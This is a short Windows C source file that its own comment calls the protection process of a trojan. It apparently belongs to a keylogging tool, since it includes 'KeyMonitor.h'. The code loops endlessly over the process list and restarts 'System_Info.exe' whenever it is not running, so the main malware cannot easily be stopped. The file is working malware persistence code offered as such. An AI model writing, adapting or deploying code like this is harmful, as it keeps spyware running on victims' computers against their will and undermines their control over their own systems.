#include"KeyMonitor.h"

/*
*Author: Pluviophile
*Date: 2020.7.20
*
*木马程序保护进程，与主功能部分搭配使用，此程序负责监控并保护
*System_Info进程
*/

char DIR[MAX_PATH];

int WINAPI WinMain
(
	HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR     lpCmdLine,
	int       nShowCmd
)
{
	BOOL hb;
	char Pro[MAX_PATH];

	memset(Pro, 0, MAX_PATH);
	int len = GetAppCurrentDir(DIR);
	
	memcpy(Pro, DIR, len + 1);
	strncat_s(Pro, "System_Info.exe", sizeof("System_Info.exe"));
	while (1)
	{
		int i = 1;
		PROCESSENTRY32 p32;
		HANDLE hPro = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
		p32.dwSize = sizeof(p32);

		hb = Process32First(hPro, &p32);
		while (hb)
		{
			puts(p32.szExeFile);
			if (!strcmp(p32.szExeFile, "System_Info.exe"))
			{
				i = 0;
				break;
			}
			hb = Process32Next(hPro, &p32);
		}
		if (i)
			CreateNewProcess(Pro);
		Sleep(1);
		CloseHandle(hPro);
	}
	
	return 0;
}